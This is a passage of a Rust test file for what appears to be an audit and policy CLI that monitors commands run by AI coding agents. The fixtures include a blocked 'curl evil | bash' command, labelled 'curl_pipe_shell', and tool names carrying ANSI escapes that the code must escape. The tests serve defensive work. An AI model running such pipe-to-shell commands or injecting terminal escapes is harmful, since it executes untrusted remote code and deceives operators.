            "c",
            None,
        );

        let read = audit_aggregator::read_log(&log).unwrap();
        let mut groups: BTreeMap<OriginGroupKey, usize> = BTreeMap::new();
        for r in read
            .records
            .iter()
            .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
        {
            let key = OriginGroupKey::from_origin(r.agent_origin.as_ref());
            *groups.entry(key).or_insert(0) += 1;
        }
        assert_eq!(groups.len(), 1, "exactly one group: unknown");
        assert_eq!(groups.keys().next().unwrap().kind, "unknown");
    }

    #[test]
    fn sessions_json_format_outputs_structured_payload() {
        // Smoke-test the JSON branch — we just verify the exit code, not stdout
        // capture (that needs a subprocess test, which the integration suite
        // already covers for similar commands).
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let human = AgentOrigin::human(true);
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo",
            Some(&human),
        );
        let code = sessions(Some(log.to_str().unwrap()), true);
        assert_eq!(code, 0);
    }

    // -----------------------------------------------------------------------
    // explain
    // -----------------------------------------------------------------------

    #[test]
    fn explain_rejects_empty_query() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let code = explain("   ", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn explain_matches_by_command_substring() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "ls -la",
            Some(&AgentOrigin::human(true)),
        );
        let code = explain("curl", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_matches_by_session_id_exact() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "sess-abc123",
            "Allow",
            &[],
            "echo",
            None,
        );
        let code = explain("sess-abc123", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_matches_by_origin_label() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        let code = explain("claude-code", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_no_match_returns_one() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            None,
        );
        let code = explain("nonsense-query", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn explain_truncates_to_max_matches() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        for i in 0..(EXPLAIN_MAX_MATCHES + 5) {
            plant_audit_line(
                &log,
                &format!("2026-05-22T10:{:02}:00+00:00", i % 60),
                &format!("s{i}"),
                "Allow",
                &[],
                &format!("echo {i}"),
                Some(&claude),
            );
        }
        let code = explain("claude-code", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn explain_missing_log_returns_one() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("nope.jsonl");
        let code = explain("anything", Some(log.to_str().unwrap()), false);
        assert_eq!(code, 1);
    }

    // -----------------------------------------------------------------------
    // policy_init
    // -----------------------------------------------------------------------

    #[test]
    fn policy_init_writes_header_only_scaffold_when_no_log() {
        let repo = tempdir().unwrap();
        let nonexistent = repo.path().join("never").join("audit.jsonl");
        let code = policy_init_for_root(
            repo.path(),
            Some(nonexistent.to_str().unwrap()),
            false,
            false,
        );
        assert_eq!(code, 0);
        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        let body = fs::read_to_string(&example_path).unwrap();
        assert!(body.contains("Tirith agent governance policy scaffold"));
        assert!(body.contains("No audit log was found"));
    }

    #[test]
    fn policy_init_lists_observed_origins() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::mcp("Cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo a",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&cursor),
        );

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let body = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();
        assert!(body.contains("claude-code"));
        assert!(body.contains("Cursor"));
        // Every entry is commented out — no bare `- kind:` lines outside a comment.
        for line in body.lines() {
            if line.trim_start().starts_with("- kind:") {
                panic!("uncommented entry leaked into scaffold: {line:?}");
            }
        }
    }

    #[test]
    fn policy_init_is_deterministic() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::agent("cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo a",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "echo b",
            Some(&cursor),
        );

        // First call: force=false, json=false (new file).
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let first = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();

        // Second call: force=true, json=false (overwrites and must produce identical bytes).
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), true, false);
        assert_eq!(code, 0);
        let second = fs::read_to_string(
            repo.path()
                .join(".tirith")
                .join("agent-policy.yaml.example"),
        )
        .unwrap();
        assert_eq!(first, second, "byte-identical scaffold across re-runs");
    }

    #[test]
    fn policy_init_refuses_overwrite_without_force() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&AgentOrigin::human(true)),
        );

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 0);
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, false);
        assert_eq!(code, 1, "second run without --force must refuse");
    }

    #[test]
    fn policy_init_overwrites_with_force() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&AgentOrigin::human(true)),
        );

        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        fs::create_dir_all(example_path.parent().unwrap()).unwrap();
        fs::write(&example_path, "SENTINEL").unwrap();

        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), true, false);
        assert_eq!(code, 0);
        let body = fs::read_to_string(&example_path).unwrap();
        assert!(!body.contains("SENTINEL"));
    }

    #[test]
    fn policy_init_scaffold_yaml_survives_hostile_payload() {
        // A hostile tool name (with ANSI escapes, newlines) is quoted-and-escaped
        // by yaml_safe_scalar so the generated YAML stays parseable AND no raw
        // control byte reaches the operator's terminal.
        let scaffold = AgentPolicyScaffold {
            audit_present: true,
            log_path: "/tmp/audit.jsonl".to_string(),
            origins: vec![ObservedOrigin {
                kind: "agent".to_string(),
                payload: Some("ev\x1b[31mil\nname".to_string()),
                interactive: None,
                count: 2,
            }],
        };
        let body = render_agent_policy_scaffold_yaml(&scaffold);
        for line in body.lines() {
            assert!(!line.contains('\x1b'), "ESC byte leaked: {line:?}");
        }
        // The escaped form is present (proves the payload reached the formatter).
        assert!(
            body.contains("\\u001b"),
            "escaped ESC must be present: {body}"
        );
    }

    #[test]
    fn policy_init_json_format_outputs_structured_preview() {
        let repo = tempdir().unwrap();
        let log = repo.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "x",
            Some(&claude),
        );
        let code = policy_init_for_root(repo.path(), Some(log.to_str().unwrap()), false, true);
        assert_eq!(code, 0);
        // The file is still on disk.
        let example_path = repo
            .path()
            .join(".tirith")
            .join("agent-policy.yaml.example");
        assert!(example_path.is_file());
    }

    // -----------------------------------------------------------------------
    // allow
    // -----------------------------------------------------------------------

    #[test]
    fn allow_accepts_valid_agent_matcher_with_tool() {
        let code = allow("agent", Some("claude-code"), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_accepts_human_without_tool() {
        let code = allow("human", None, false);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_rejects_tool_on_human() {
        let code = allow("human", Some("anything"), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_tool_on_gateway() {
        let code = allow("gateway", Some("anything"), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_unknown_kind() {
        let code = allow("telepathy", None, false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_rejects_empty_tool_string() {
        let code = allow("agent", Some(""), false);
        assert_eq!(code, 1);
    }

    #[test]
    fn allow_snippet_round_trips_through_yaml() {
        // The emitted snippet must parse cleanly inside an agent_rules.allow
        // block — `tirith policy validate` is what the operator will run after
        // pasting, and a broken render would break that.
        let snippet = render_allow_snippet(&AgentMatcher {
            kind: AgentOriginKind::Agent,
            tool: Some("claude-code".to_string()),
        });
        let yaml = format!("agent_rules:\n  allow:\n{snippet}");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).expect("snippet parses");
        let kind = parsed
            .get("agent_rules")
            .and_then(|v| v.get("allow"))
            .and_then(|v| v.as_sequence())
            .and_then(|s| s.first())
            .and_then(|e| e.get("kind"))
            .and_then(|k| k.as_str());
        assert_eq!(kind, Some("agent"));
    }

    #[test]
    fn allow_snippet_quotes_hostile_payload() {
        // Hostile payload — ANSI escape, newline. Must be quoted-and-escaped.
        let snippet = render_allow_snippet(&AgentMatcher {
            kind: AgentOriginKind::Agent,
            tool: Some("ev\x1b[31mil".to_string()),
        });
        assert!(!snippet.contains('\x1b'));
        let yaml = format!("agent_rules:\n  allow:\n{snippet}");
        let _parsed: serde_yaml::Value =
            serde_yaml::from_str(&yaml).expect("hostile-payload snippet still parses");
    }

    #[test]
    fn allow_json_format_succeeds_for_valid_matcher() {
        let code = allow("agent", Some("claude-code"), true);
        assert_eq!(code, 0);
    }

    #[test]
    fn allow_json_format_returns_one_on_invalid_kind() {
        let code = allow("nonsense", None, true);
        assert_eq!(code, 1);
    }
}
